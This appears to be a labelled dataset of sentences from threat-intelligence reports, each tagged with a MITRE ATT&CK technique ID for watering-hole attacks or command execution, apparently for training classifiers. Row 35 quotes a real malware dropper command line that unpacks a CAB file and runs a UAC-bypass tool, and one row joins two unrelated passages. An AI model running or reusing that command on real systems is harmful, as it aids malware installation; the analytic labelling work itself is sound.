,sentence,label_tec
0,"From these reports, we know that the group uses an abundance of tools and tactics, ranging across zero-day exploits targeting common applications such as Java or Microsoft Office, heavy use of spear-phishing attacks, compromising legitimate websites to stage watering-hole attacks, and targeting over a variety of operating systems – Windows, OSX, Linux, even mobile iOS",T1189
1,"We believe this access was abused, for example, by inserting malicious scripts in the country’s official websites in order to conduct watering hole attacks",T1189
2,What does the resulting watering hole look like? The websites were compromised to redirect visitors to instances of both ScanBox and BEeF,T1189
3,"This targeting of third party organizations to attack further targets is a risky move on the attackers’ part, as it potentially reveals their activity within the compromised third party organizations to the new target (those receiving the malicious documents  Making sense of MuddyWater When we looked at the cluster of activity which consisted of what appeared to be espionage-focused attacks in the Middle East, we were somewhat confused as the previous public reporting had attributed these attacks to FIN7",T1189
4,Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks,T1189
5,Malefactors used watering hole attacks to compromise legitimate and trusted websites frequently visited by their targets,T1189
6,"The payload delivered in these November 2017 attacks using DDE enabled documents was SofacyCarberp, which differs from the Zebrocy downloader delivered in the February 2018 attacks",T1189
7,"Like many threat groups, TG-3390 conducts strategic web compromises (SWCs), also known as watering hole attacks, on websites associated with the target organization's vertical or demographic to increase the likelihood of finding victims with relevant information",T1189
8,"[2] Threat groups use strategic web compromises (SWCs), also known as watering hole attacks, to target a wide array of potential victims",T1189
9,"Threat actors compromise a website used by their target demographic (e.g., compromising a website specializing in oil and gas industry news when targeting the energy vertical)",T1189
10,This is followed by a number of Linux shell command style commands related to the malware establishing persistence,T1059
11,"The malware’s capabilities include taking a system survey, access to the filesystem, executing commands and a reverse shell",T1059
12,"This indicates that a human operative was executing commands on a command line style interface, rather than an automated or GUI process",T1059
13,"Although MURKYTOP is primarily a command-line reconnaissance tool, it can also be used for lateral movement",T1059
14,"The majority of ActiveX Objects created with Wscript.Shell and Shell.Application are used to run programs, create shortcuts, manipulate the contents of the registry, or access system folders",T1059
15,Tracked Commands During observation of the described above “router-PC” CnC we tracked the following commands delivered in the config file before the server went offline,T1059
16,"After decryption, these 34 commands are plain text with parameters that are space delimited much like a command line",T1059
17,"The command and parameter names are hashed before being compared by the binary, making it difficult to recover the original names of commands and parameters",T1059
18,These commands are also executed when the loadconfig command is issued,T1059
19,"The loadconfig and state commands are executed during initialization, effectively creating the configuration file if it does not exist and writing the state command to it",T1059
20,"The command tab will show previously issued commands, when they were issued, and their status, as seen in Figure 4",T1059
21,Glimpse’s Agent Control Panel showing the interface actors would use to send commands The actor clicks the command to view the results in a popup window named “Result Viewer”,T1059
22,Figure 7 shows just how similar these two batch scripts are with several of the headers being exactly the same and a majority of the commands being the same with the Helminth commands having the 2>&1 suffix to include command errors with the output,T1059
23,This script relays commands and output between the controller and the system,T1059
24,The threat actors used the appcmd command-line tool to unlock and disable the default logging component on the server (systsm.webServer/httplogging) and then delete existing logs from the system (see Figure 4),T1059
25,"RemoteCMD: This tool executes commands on remote computers, similar to the PsExec tool",T1059
26,These are in-line with the targeting of the victims witnessed by the attackers using Conmie,T1059
27,Intrusions and campaigns conducted by this group are in-line with PRC goals and self-interest in Taiwan,T1059
28,Gather network addresses and operating system version Execute arbitrary commands using “cmd.exe /c”  The capability to execute system commands,T1059
29,Figure 3: ALFA TEaM Shell v2-Fake Mail (Default) Figure 4 shows an example email containing the default values the shell,T1059
30,Remexi is a basic back door Trojan that allows attackers to open a remote shell on the computer and execute commands,T1059
31,"Though this is unsophisticated, a remote shell does provide a highly flexible and powerful means of remote access in the hands of a skilled attacker",T1059
32,!CMD  Trojan executes a command prompt command,T1059
33,The Trojan will save the output of the command to %TEMP%\win<random number>.txt and send the contents to the C2 server or “The length of Cmd result file is ziro!” if the command was unsuccessful,T1059
34,Both variants need to be executed with the command line argument “[2]” to avoid continually attempting to copy and execute the Trojan using the “tmp.vbs” and “tmp1.vbs” files,T1059
35,The Visual Basic macro uses the following command line:  cmd /c expand %TEMP%\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exe  The control server credential information contained in the CAB files is different:   Decoded credential data contained in another ipnet.ini,T1059
36,/user <parameters>: Executes downloaded file with parameters specified using CreateProcessAsUser cmd /c <command>: Executes command on infected endpoint   Conclusion  The actor behind Honeybee has been operating with new implants since at least November 2017 with the first known version of NTWDBLIB installer,T1059
